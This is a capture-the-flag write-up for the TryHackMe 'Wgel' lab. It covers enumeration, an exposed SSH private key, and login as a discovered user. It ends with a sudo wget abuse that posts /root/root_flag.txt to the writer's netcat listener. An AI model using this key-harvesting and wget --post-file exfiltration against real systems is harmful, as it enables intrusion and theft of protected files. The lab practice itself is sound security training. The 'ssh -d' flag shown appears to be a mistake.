# Wgel CTF - THM 
Can you exfiltrate the root flag?

### Discover and Scanning 

- nmap
	- port 22 : openSSH 7.2p2
	- port 80 : Apache httpd 2.4.18

- gobuster on port 80
	- a few responses but one particularly useful : sitemap/.ssh
	- navigating to <ip>/.ssh we get an id\_rsa file
	- download the ssh key but still need a user

- sifting through source for the webpage found at <ip>/sitemap
	- nothing

- curious as to why site isn't default when visiting the ip
	- view page source of <ip> 
	- comment : \<!-- Jessie don't forget to update the website --> 
	- Jessie could be a dev or systems engineer, etc 

### Exploit

- login via ssh
	- ssh -d id\_rsa jessie@\<ip>
	- successful jessie@CorpOne

### Find user flag

- find /home/jessie/ -name \*.txt
	- /home/jessie/Documents/user\_flag.txt

### Priv esc

- unaware of jessie's password, so check what sudo abilities he has
	- sudo -l
		- can run /usr/bin/wget with no password

	- no need for priv esc now

### Get root flag

	- finding root flag
		- find /root/ -name *.txt
		- /root/root_flag.txt 
	- open a nc listener 
		- nc -lvnp 9001
	- post file with wget	
		- sudo wget --post-file=/root/root_flag.txt http://<my_ip>:9001
	- flag will be printed to screen on my device
